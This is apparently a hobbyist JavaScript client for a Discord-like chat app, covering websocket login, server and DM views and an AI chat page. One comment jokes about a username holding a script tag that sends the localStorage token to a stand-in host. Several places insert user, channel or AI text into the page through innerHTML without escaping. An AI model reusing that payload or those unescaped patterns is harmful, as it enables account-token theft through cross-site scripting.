import { Modal } from "./modals.js";
import { newUserPopUpCard, sendMessageToChannel, switchChannel, fetchInfo, renderMessage, stopTyping, showTyping, getNewMessages } from "./server-beta.js";
import { dmPage, sendMessageToDm } from './dms-new.js';

const loadingSplashes = [
  "Did you know that you are an early user to log on to Revolution? Crazy!",
  "We added a new loading screen.. Looks?",
  "Revolution has been made to be accessible for everyone."
]

const randItem = (arr) => arr[Math.floor(Math.random() * arr.length)]

document.getElementById("top-alert").textContent = `${randItem(loadingSplashes)} - Please hang tight...`

addEventListener("error", (e) => document.getElementById("top-alert").textContent = e.message)

let startLocation = location.href.split("/channels/")[1];

if (!location.href.includes("/channels")) {
  startLocation = "@me"
}

const getClientVersion = (async() => {
  var versionpy = await fetch(`/static/version.txt`);
  var v = await versionpy.text();
  return v.split(' ')[0];
});

const servers = {}
let user = {}
let rackedUpMessages = 0;

let loadedRevolution = false
let firstLoadedMessages = true;

const date = new Date()
let websck;

var version = "0.0.0.0";

document.addEventListener('click', async(e) => {
  rackedUpMessages = 0;
});

const onload = (async() => {
  version = await getClientVersion();
  setInterval(async() => {
    const grab = document.querySelector('head').querySelector('title');
    const nt = grab.textContent.split(') ')[1] || grab.textContent;
    if (rackedUpMessages === 0) {
      grab.textContent = nt;
    } else {
      grab.textContent = "(" + rackedUpMessages + ") " + nt;
    }
  },1000);
})();

if (localStorage.getItem("token") === null) location.href = "/login"

const warnVictim = (() => {
  console.log(`%c
HOLD UP!
`,"color:red;font-size:36px;width:500px;height:100px;border:1px white solid;");
  console.info(`%c
The only reason you should open this console is for debugging or testing. Do not paste unrecognised/unauthorised code in here at all! This may give the remote user access to your account, then it is game over.
`, "color:yellow;");
  console.log(`%cYou have been warned this before it's too late.`, "color:cyan;");
  console.log(`%c                        ██████████████  
                      ████░░████████████
                      ██████████████████
                      ██████████████████
                      ██████████████████
                      ████████          
                      ██████████████░░  
                      ██████            
  ██              ██████████            
  ██▒▒        ▒▒▒▒██████████▒▒▒▒        
  ████▓▓      ██████████████  ▒▒        
  ██████▒▒▒▒████████████████            
  ██████████████████████████            
    ██████████████████████              
        ██████████████████              
        ▒▒██████████████                
          ▒▒██████▒▒██▓▓                
            ████      ▓▓                
            ██▒▒      ▓▓                
            ██        ██                
`,"color:yellow;");
});
const currentlyLoading = (async() => {
  const loadingicon = document.querySelector('.loadingIcon');
  if (loadingicon.hidden == false) {
    loadingicon.hidden = true;
  } else {
    loadingicon.hidden = false;
  }
  return null;
});
warnVictim();

setInterval(warnVictim,20000);

const websocket = async () => {
  websck = await new WebSocket("wss://revolutionweb.onrender.com");
  //await currentlyLoading();
  
  websck.onopen = async function(e) {
    if (document.querySelector('.loadingIcon').hidden == false)
      await currentlyLoading();
    websck.send(JSON.stringify({"type": "login", "token": localStorage.getItem("token")}))
    var v = await getClientVersion();
    if (v != version) {
      alert("A new version is available. We are reloading your client.");
      location.reload();
    }
    //websck.send(JSON.stringify({ "type": "follow", "channels": [sId + "~" + currChannel], "token": "guest" }));
  };
  
  websck.addEventListener('message', async (ev) => {
    //console.log(ev.data);
    await currentlyLoading();
    console.log(JSON.parse(ev.data))
    const obj = JSON.parse(ev.data)
    await currentlyLoading();
    if (obj.type === "serverInfo") {
      if (loadedRevolution) return
      servers[obj.server.serverid] = obj.server
      const serverElem = document.createElement("button")
      const serverPopup = document.createElement("span");
        //= <span class="server-hover-popup" id="hover-popup">{${ServerName}}</span>
      serverElem.classList.add("server-item")
      serverElem.style.background = "url('" + obj.server.imgurl + "')"
      serverElem.style.backgroundSize = "100%"
      serverPopup.classList.add("server-hover-popup");
      serverPopup.id = "hover-popup";
      serverPopup.textContent = obj.server.name;
      serverElem.appendChild(serverPopup);
      document.getElementById("serverList").appendChild(serverElem)
      serverElem.addEventListener("click", async () => {
        serverPage(obj.server, obj.server.channels[0])
      });
      serverElem.addEventListener("mouseover", async(e) => {
        var popup = serverElem.children[0];
        popup.classList.add("show");
      });
      serverElem.addEventListener("mouseout", async(e) => {
        var popup = serverElem.children[0];
        popup.classList.remove("show");
      });
    }
    if (obj.type === "ready") {
      if (loadedRevolution) return
      console.log("%c[SOCKETMANAGER]","color:lightgreen;","Received data from ready: ",obj)
      //document.getElementById("top-alert").textContent = new Date() - date + "ms!"
      document.getElementById("current-username").textContent = obj.user.name
      document.getElementById("discriminator").textContent = "#" + obj.user.discriminator
      user = obj.user
      document.getElementById("loading").classList.add('invisible')
      setTimeout(() => {
        document.getElementById("loading").classList.remove('invisible')
        document.getElementById("loading").hidden = true
      }, 500)
      document.getElementById("bottom-nav").hidden = false
      if (user.id === 173193019279) {
        appendTask("Create an account", "You are not signed in with a Revolution account. Signing into a Revolution account will give you great perks across all servers.", "/login", "Sign in")
      }
      if (false) appendTask("Eligible for staff", "You are eligible for moderation at Revolution. Apply now and get a snazzy badge next to your name in profile cards!", "/apps/moderation?type=staff", "Apply for Revolution staff");
      appendTask("Check the new Settings page", "We've updated the Settings page with new content, Go check it out!", "/channels/@settings", "Go to Settings app");
      loadedRevolution = true
      if (startLocation === "@me") {
        homePage()
      }
      if (startLocation.includes("/") && startLocation.split("/")[0] !== "@me") {
        serverPage(servers[startLocation.split("/")[0]], startLocation.split("/")[1])
      }
      
      if (!location.href.endsWith('@me') && location.href.includes('/channels/@me/')) {
        let dmid = location.href.split("/channels/@me/")[1]
        var res = await fetch("/api/dms/list", {
          "headers": {
            "token": localStorage.getItem("token")
          }
        });
        const dmsArr = await res.json()
        startTab()
        for (const x of dmsArr) {
          if (parseInt(x.id) == parseInt(dmid)) {
            dmPage(x)
          }
        }
        //dmPage(dmid)
      }
      if (!location.href.endsWith('@me') && location.href.includes('/channels/@me/')) {
        let dmid = location.href.split("/channels/@me/")[1]
        var res = await fetch("/api/dms/list", {
          "headers": {
            "token": localStorage.getItem("token")
          }
        });
        const dmsArr = await res.json()
        startTab()
        for (const x of dmsArr) {
          if (parseInt(x.id) == parseInt(dmid)) {
            dmPage(x)
          }
        }
        //dmPage(dmid)
      }
    }
    if (obj.type === "messageCreate") {
      await currentlyLoading();
      await renderMessage(obj)
      await currentlyLoading();
      rackedUpMessages++;
    }
    if (obj.type === "userTyping") {
      let payload = await showTyping(obj, user);
      setTimeout(async()=> { await stopTyping(obj, payload, user); }, 5000);
    }
    if (obj.type == "voiceBroadcast") {
      const audioURL = obj.data;
      //const audioChannelId = obj.id;
      playback(audioURL);
    } 
    if (obj.type == "error") {
      if (obj.code == "invalid_token") {
        // redirect the user to the login page, get rid of token from storage
        localStorage.token = null;
        window.location.href = "/app/login#token_expired";
      }
    }
  });
  
  websck.addEventListener('close', async (e) => {
    if (window.navigator.onLine) {
      await currentlyLoading();
      console.log('Reconnecting...');
      setTimeout(() => websocket(), 100)
    } else {
      await currentlyLoading();
      window.location = "/app"
    }
  });
};
websocket();

const appendTask = (name, description, link, linkName) => {
  const task = document.createElement("li")
  task.classList.add("today-item")
  task.innerHTML = `<h4>${name} - <small>${description}</small> <a href="${link}" > <button class="primary">${linkName}</button></a></h4>`
  document.getElementById("todayItems").appendChild(task)
}

let channelType = ""

/*document.getElementById('message-input').addEventListener("input", async(i) => {
  console.log('hello')
  if (channelType === "s") {
    console.log('> Check 1 passed')
    // the channel type is a server channel
    var data__headers = {
      character: i.key,
      id: (currServer + "~" + currChannel),
      token: localStorage.token
    }
    var data = {
      headers: data__headers
    }
    let sendTyping = await fetch(`/api/v1/typing`, data);
    console.log('> Check 2 passed')
    let sendTypingResp = await sendTyping.text();
    console.log(`Sent typing: "${sendTypingResp}"`);
  }
});*/

const startTab = async () => {
  const res = await fetch("/api/dms/list", {
    "headers": {
      "token": localStorage.getItem("token")
    }
  });
  const dmListModel = `
<div class="message-item mb-2">
  <span id="user-$(userId)" class="message-item-link"><img src="/assets/images/Revolution.png" width="30" style="border-radius: 50%; padding: 5px 5px;">&nbsp;&nbsp;$(userName)</span>
</div>
  `
  const dmsArr = await res.json()
  const dmsList = document.getElementById("dms-list")
  dmsList.innerHTML = ""; // oops incorrect variable name
  for (let c of dmsArr) {
    const div = document.createElement("div")
    const span = document.createElement("span")
    const img = document.createElement("img")
    div.classList.add("message-item")
    div.classList.add("mb-2")
    span.classList.add("message-item-link")
    span.id = `user-${c.user.id}`
    span.addEventListener("click", () => {
      console.log("hey " + c.user.name + "!")
      console.log(c)
      dmPage(c) // Uncaught ReferenceError: dmPage is not defined
    })
    
    img.src = "/assets/images/Revolution.png"
    img.width = "30"
    img.style = "border-radius: 50%; padding: 5px 5px;";
    span.appendChild(img)
    const innerSpan = document.createElement("span")
    innerSpan.textContent = c.user.name
    span.appendChild(innerSpan) //hope no one names themselves <script>fetch("https://script.steal", {"token": localStorage.getItem("token")})</script> this is weird
    div.appendChild(span); // im so confused
    dmsList.appendChild(div) // how do I make it clear the innerHTML of the div before appending stuff
  }
}

const homePage = async () => {
  await currentlyLoading();
        document.getElementById("home").hidden = false
        document.getElementById("add-a-user-panel").hidden = true
        document.getElementById("messages").hidden = true
        document.getElementById("message-input").hidden = true
        document.getElementById("user-list").hidden = true
        document.getElementById("generalTab").hidden = false
        document.getElementById("channel-list").hidden = true
  document.getElementById("welcomeText").textContent = `Welcome to Revolution, ${user.name}! Hope you like beta testing!`
  document.getElementsByTagName("title")[0].textContent = "Home Page | Revolution"
  history.pushState({}, "Home Page | Revolution", "https://revolutionweb.onrender.com/channels/@me")
  startTab()
  await currentlyLoading();
}
document.getElementById("homeButton").addEventListener("click", homePage)

const serverPage = async (server, channel) => {
          //location.href = "https://revolution-web.repl.co/channels/@s/" + obj.server.serverid
  await currentlyLoading();
        document.getElementById("home").hidden = true
        document.getElementById("add-a-user-panel").hidden = true
        document.getElementById("messages").hidden = false
        document.getElementById("message-input").hidden = false
        document.getElementById("user-list").hidden = false
        document.getElementById("generalTab").hidden = true
        document.getElementById("channel-list").hidden = false
        document.getElementsByTagName("title")[0].textContent = "#" + channel + " | Revolution"
        history.pushState({}, "#" + channel + " | Revolution", "https://revolutionweb.onrender.com/channels/" + server.serverid + "/" + channel)
        document.getElementById("input-area").hidden = true
        document.getElementById("read-only").hidden = false
        document.getElementById("logo").src = server.imgurl
        document.getElementById("sName").textContent = server.name
  document.getElementById("serverBanner").style.background = server.color + "7f"
document.getElementById("border-top").style.borderImage = `linear-gradient(to right, ${server.color}, darkorchid) 1`
        window.channelType = "s"
        window.currServer = server.serverid;
        window.currChannel = channel;
        document.getElementById("channels").textContent = ""
        for (let c of server.channels) {
          document.getElementById("channels").innerHTML += `<li class="nav-item"><button class="channel-item-btn" onclick="switchChannel(this)" name="${c}">
          <i class="fas fa-hashtag" style="float: left;"></i>
          <rrt>${c}</rrt>
        </button></li>`
        }
        getNewMessages(server.serverid)
        /* fix to non-loading messages below: (deployed by Eric) */
        websck.send(JSON.stringify({ "type": "resetfollowlist", "token": localStorage.getItem("token") }));
        websck.send(JSON.stringify({ "type": "follow", "channels": [window.currServer + "~" + window.currChannel], "token": localStorage.getItem("token") /* "guest" */ }));
        /* end fix */
        fetchInfo(server.readonly); // you are doing awesome!
  await currentlyLoading();
}

const systemPage = async () => {
  await currentlyLoading();
  document.getElementById("home").hidden = true
  document.getElementById("add-a-user-panel").hidden = true
  document.getElementById("messages").hidden = false
  document.getElementById("message-input").hidden = false
  document.getElementById("user-list").hidden = false
  document.getElementById("memberListUser").textContent = user.name
  document.getElementById("message-list").innerHTML = `<li style="padding-left: 10px; color: white; width: 100%;" -onmouseover="const collection = this.children; this.style.background = '#535357'; this.style.color = 'white';" -onmouseout="const collection = this.children; this.style.background = 'transparent'; this.style.color = 'white';"><b><img src="/assets/images/Revolution.png" width="40" style="background: blue; border-radius: 20%;"/> <onclickFunc>Revolution</onclickFunc> <span class="badge" style="background: mediumpurple;">SYSTEM <i class="fa fa-check"></i></span> </b> <br/>Welcome to <b>Revolution</b>!</li>`
  document.getElementById("input-area").hidden = true
  document.getElementById("read-only").hidden = false
  document.getElementsByTagName("title")[0].textContent = "System Messages | Revolution"
  history.pushState({}, "System Messages | Revolution", "https://revolutionweb.onrender.com/channels/@system")
  window.channelType = "@system"
  startTab()
  await currentlyLoading();
}
document.getElementById("system").addEventListener("click", systemPage)
if (startLocation === "@system") systemPage()

let aiMessages = []
const aiPage = async () => {
  await currentlyLoading();
  document.getElementById("home").hidden = true
  document.getElementById("add-a-user-panel").hidden = true
  document.getElementById("messages").hidden = false
  document.getElementById("message-input").hidden = false
  document.getElementById("user-list").hidden = false
  document.getElementById("memberListUser").textContent = user.name
  document.getElementById("message-list").innerHTML = `<li style="padding-left: 10px; color: white; width: 100%;" -onmouseover="const collection = this.children; this.style.background = '#535357'; this.style.color = 'white';" -onmouseout="const collection = this.children; this.style.background = 'transparent'; this.style.color = 'white';"><b><img src="/assets/images/Revolution.png" width="40" style="background: blue; border-radius: 20%;"/> <onclickFunc onclick="newUserPopUpCard(86974321651)">Revolved</onclickFunc> <span class="badge" style="background: mediumpurple;">Revolved <i class="fa fa-check"></i></span> </b> <br>Hi! I am the new Revolved AI revolved around Revolution! Ask me any question and I will search the internet quickly to answer it to the best of my ability. Whatever I say and do, does not reflect Revolution's views. If you notice a bad message, make sure to report it on the Revolution Official Discord. I do not save messages.</li>`
  document.getElementsByTagName("title")[0].textContent = "Revolved AI | Revolution"
  history.pushState({}, "Revolved AI | Revolution", "https://revolutionweb.onrender.com/channels/@ai")
  document.getElementById("input-area").hidden = false
  document.getElementById("read-only").hidden = true
  window.channelType = "@ai";
  aiMessages = []
  startTab()
  await currentlyLoading();
}
document.getElementById("revolvedai").addEventListener("click", aiPage)
if (startLocation === "@ai") aiPage()

async function sleep(ms) {
  return await new Promise(resolve => setTimeout(resolve, ms));
}

const addUserPage = async () => {
  await currentlyLoading();
  document.getElementById("home").hidden = true
  document.getElementById("add-a-user-panel").hidden = false
  document.getElementById("messages").hidden = true
  document.getElementById("message-input").hidden = true
  document.getElementById("user-list").hidden = true
  document.getElementsByTagName("title")[0].textContent = "Add a User | Revolution"
  history.pushState({}, "Add a User | Revolution", "https://revolutionweb.onrender.com/channels/@add")
  document.getElementById("input-area").hidden = false
  document.getElementById("read-only").hidden = true
  channelType = "@add"
  startTab()
  await currentlyLoading();
}
document.getElementById("add-a-user").addEventListener("click", addUserPage)
if (startLocation === "@add") addUserPage()

document.getElementById('sendMessage').parentElement.addEventListener('click', async e => {
  if (window.channelType === "@ai") {
    const endpoint = "/ai/revolved/get_response";
    await currentlyLoading();
      const input = document.querySelector('#input-area div');
      const channel_messages = document.querySelector('.channel-messages ul');
      aiMessages.push({"role": "user", "content": input.textContent.replace(";", "\n")})
      const data = {
        "query": input.textContent.replaceAll(';','\n'),
        "past50": [],
        "token": localStorage.getItem("token"),
        "messages": aiMessages
      }
      const actualM = `<li style="padding-left: 10px; color: white; width: 100%;" -onmouseover="const collection = this.children; this.style.background = '#535357'; this.style.color = 'white';" -onmouseout="const collection = this.children; this.style.background = 'transparent'; this.style.color = 'white';"><b><img src="/assets/images/Revolution.png" width="40" style="background: blue; border-radius: 20%;"/> <onclickFunc onclick="newUserPopUpCard(${user.id})">${user.name}</onclickFunc> <span class="badge" style="background: mediumpurple;">BETA TESTER <i class="fa fa-check"></i></span> </b> <br>${marked.parse(data.query)}</li>`;
      channel_messages.insertAdjacentHTML('beforeend', actualM);
      const user_typing = document.querySelector('.user-typing');
      user_typing.hidden = false;
      const request = await fetch(endpoint, {method:"POST",body:JSON.stringify(data)});
      const backedData = await request.json();
      const backedDatasp = backedData.response.split(" ");
      
      const message = `
        <li style="padding-left: 10px; color: white; width: 100%;" -onmouseover="const collection = this.children; this.style.background = '#535357'; this.style.color = 'white';" -onmouseout="const collection = this.children; this.style.background = 'transparent'; this.style.color = 'white';">
          <b>
          <img src="/assets/images/Revolution.png" width="40" style="background: blue; border-radius: 20%;"/>
          <onclickFunc onclick="newUserPopUpCard(86974321651)">Revolved</onclickFunc> 
          <span class="badge" style="background: mediumpurple;">Revolved <i class="fa fa-check"></i></span> </b> <br> ↪ <small>${marked.parse(data.query)}</small><br><ans></ans>
        </li>`;
      aiMessages.push({"role": "assistant", "content": backedData.response})
      user_typing.hidden = true;
      channel_messages.insertAdjacentHTML('beforeend', message);
      var e = channel_messages.querySelectorAll('li')[channel_messages.querySelectorAll('li').length-1];
      var a = e.querySelector('ans');
      console.log(backedData);
      for (const i of backedDatasp) {
        a.innerHTML += `${i} `;
        await sleep(100);
        document.querySelector('.channel-messages ul').scrollTop = document.querySelector('.channel-messages ul').scrollHeight
        var e = document.querySelector('.channel-messages ul').children[document.querySelector('.channel-messages ul').children.length-1];
        e.scrollIntoView({ block: "end", behavior: "smooth" });
        a.innerHTML = a.innerHTML.replaceAll('\n','<br>');
      }
      a.innerHTML = marked.parse(a.innerText);
    await currentlyLoading();
  }
  if (window.channelType === "s") {
    sendMessageToChannel(currChannel)
  }
  if (window.channelType === "d") {
    await currentlyLoading();
    await sendMessageToDm(currDm);
    await currentlyLoading();
  }
})

//document.getElementById("top-alert").textContent = new Date() - date + "ms"

document.getElementById("addUserButton").addEventListener("click", async () => {
  await currentlyLoading();
  if (document.getElementById("add-username").value.includes('Revolution#0001')) {
    document.getElementById("join-server-content").textContent = "You are not allowed to friend this user; refresh the page to continue using Revolution.";
    document.getElementById("join-server-modal").hidden = false;
    await currentlyLoading();
    return;
  }
  const res = await fetch("/api/dms/add", {
    "method": "POST",
    "body": JSON.stringify({"username": document.getElementById("add-username").value}),
    "headers": {
      "token": localStorage.getItem("token")
    }
  });
  if (res.status == 500) {
    document.getElementById("join-server-content").textContent = "This user does not exist or has been removed from the platform.";
    document.getElementById("join-server-modal").hidden = false;
    setTimeout(() => {
      document.getElementById("join-server-modal").hidden = true;
    }, 5000);
    await currentlyLoading();
    return;
  }
  document.getElementById("add-username").value = ""
  const data = await res.text()
  const dm = await (await fetch("/api/dms/get/" + data, {
    "headers": {
      "token": localStorage.getItem("token")
    }
  })).json()
  dmPage({"user": dm.users.find(c => user.id !== c), "id": dm.id})
  await currentlyLoading();
})

document.getElementById("add-server").addEventListener("click", async () => {
  // await currentlyLoading();
  document.getElementById("join-server-content").innerHTML = `
  <small class="modal-title">JOIN A NEW SERVER</small>
  <button class='btn btn-primary' id="createServer">Create a Server</button>
  <br/>
  <input id='inviteCode' placeholder='Invite Code' class='input-of-text'/>
  <div class='join-server-modal-buttons'>
    <button class='btn btn-primary' id="joinServerButton">Join</button>
    <button class='btn btn-danger' id='exitServerModal'>Exit</button>
  </div>`;
  document.getElementById("join-server-modal").hidden = false;
  document.getElementById("createServer").addEventListener("click", () => {
    document.getElementById("join-server-content").innerHTML = `
  <small class="modal-title">CREATE A NEW SERVER</small>
  <input id='newServerName' placeholder='Name' class='input-of-text'/>
  <div class='join-server-modal-buttons'>
    <button class='btn btn-primary' id="createServer">Create</button>
    <button class='btn btn-danger' id='exitServerModal'>Exit</button>
  </div>`;
    document.getElementById("createServer").addEventListener("click", async () => {
      const newServerName = document.getElementById("newServerName").value
      await fetch("/api/v1/servers/create", {
        "method": "POST",
        "body": JSON.stringify({"name": newServerName}),
        "headers": {
          "token": localStorage.getItem("token")
        }
      })
    })
    document.getElementById("exitServerModal").addEventListener("click", () => {
      document.getElementById("join-server-modal").hidden = true;
    });
  })
  document.getElementById("exitServerModal").addEventListener("click", () => {
      document.getElementById("join-server-modal").hidden = true;
      //await currentlyLoading();
  });
  
  document.getElementById("joinServerButton").addEventListener("click", async () => {
    await fetch("/api/v1/servers/join", {
      method: "POST",
      body: JSON.stringify({"code": document.getElementById("inviteCode").value}),
      headers: {
        "Context-Type": "application/json",
        "Authorization": "Bearer " + localStorage.getItem("token")
      }
    })
  })
})

document.getElementById("logoutButton").addEventListener("click", async () => {
  await currentlyLoading();
  localStorage.removeItem("token");
  location.href = "/login";
});

document.querySelector('.user-profile-main .profile-click').addEventListener("click", async () => {
  await currentlyLoading();
  if (document.querySelector('.user-profile-main-popup').hidden) { 
    document.querySelector('.user-profile-main-popup').hidden = false;
  } else {
    document.querySelector('.user-profile-main-popup').hidden = true;
  }
  await currentlyLoading();
});

const registerServiceWorker = async () => {
  if ("serviceWorker" in navigator) {
    try {
      const registration = await navigator.serviceWorker.register("./serviceWorker.js", {
        scope: "/",
      });
    } catch (e) {
      console.error("Failed to register service worker: ", e)
    }
  }
}

window.channelType = channelType;
window.rackedUpMessages = rackedUpMessages;

export { user, firstLoadedMessages, rackedUpMessages, servers, websck };
export function modifyA( x, value ) { x = value; }
